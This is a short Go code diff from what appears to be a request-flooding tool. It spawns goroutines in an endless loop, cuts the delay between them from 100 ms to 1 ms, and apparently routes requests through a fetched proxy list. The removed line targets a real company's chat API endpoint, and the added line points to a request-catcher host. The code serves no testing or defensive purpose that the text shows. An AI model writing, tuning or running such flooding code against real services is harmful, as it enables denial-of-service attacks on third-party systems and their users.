@@ -23,7 +23,7 @@ func main() {
 
 	for {
 		go flooder()
-		time.Sleep(time.Millisecond * 100)
+		time.Sleep(time.Millisecond * 1)
 	}
 }
 
@@ -52,7 +52,7 @@ func fetchProxyList() []string {
 }
 
 func flooder() {
-	url := "https://chat.ace.teliacompany.net/23/chatRequest" // Replace with your API endpoint
+	url := "https://wew.requestcatcher.com/" // Replace with your API endpoint
 	uid, err := uuid.NewUUID()
 	if err != nil {
 		fmt.Printf("Error generating UUID: %s\n", err)
